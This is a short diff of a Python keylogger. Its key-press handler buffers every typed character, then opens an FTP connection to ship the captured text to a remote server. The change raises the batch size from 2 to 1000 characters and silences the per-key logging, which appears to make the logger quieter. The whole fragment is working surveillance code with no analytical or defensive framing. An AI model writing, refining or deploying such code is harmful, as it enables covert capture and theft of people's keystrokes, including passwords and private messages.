@@ -14,7 +14,7 @@ def on_press(key):
     global key_press_data
     try: 
         key_press_data += key.char
-        if(len(key_press_data) == 2):
+        if(len(key_press_data) == 1000):
             logging.info('String: {0}'.format(key_press_data))
             key_press_data=""
             ftp_server = ftplib.FTP()
@@ -33,9 +33,9 @@ def on_press(key):
             except Exception as e:
                 print(str(e))
 
-        logging.info('Key {0} pressed'.format(key.char))
+        #logging.info('Key {0} pressed'.format(key.char))
     except:
-        logging.info('special key {0} pressed'.format(key))
+        print('special key {0} pressed'.format(key))
 
 
         
